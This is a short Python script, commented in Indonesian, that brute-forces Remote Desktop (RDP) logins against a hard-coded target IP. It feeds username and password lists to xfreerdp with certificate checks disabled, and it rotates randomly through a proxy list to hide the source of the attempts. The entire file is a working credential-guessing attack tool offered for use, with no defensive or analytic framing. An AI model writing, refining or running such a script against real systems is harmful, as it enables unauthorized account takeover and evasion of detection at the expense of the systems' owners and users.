import time
import subprocess
import random

TARGET_IP = "192.168.1.100"  # Ganti dengan IP target

def load_list(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

def try_rdp(proxy, username, password):
    print(f"[+] Mencoba {username}:{password} melalui {proxy}")
    
    proxy_env = {
        "ALL_PROXY": proxy
    }

    try:
        result = subprocess.run([
            "xfreerdp", f"/u:{username}", f"/p:{password}", f"/v:{TARGET_IP}",
            "/cert:ignore", "/timeout:3000"
        ], env=proxy_env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)

        output = result.stdout.decode().lower()
        if "connected to" in output:
            print(f"[✅] LOGIN BERHASIL: {username}:{password}")
            return True
    except subprocess.TimeoutExpired:
        print("[-] Timeout")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

def main():
    proxies = load_list("proxies.txt")
    usernames = load_list("usernames.txt")
    passwords = load_list("passwords.txt")

    for username in usernames:
        for password in passwords:
            proxy = random.choice(proxies)
            if try_rdp(proxy, username, password):
                return
            time.sleep(2)

if __name__ == "__main__":
    main()
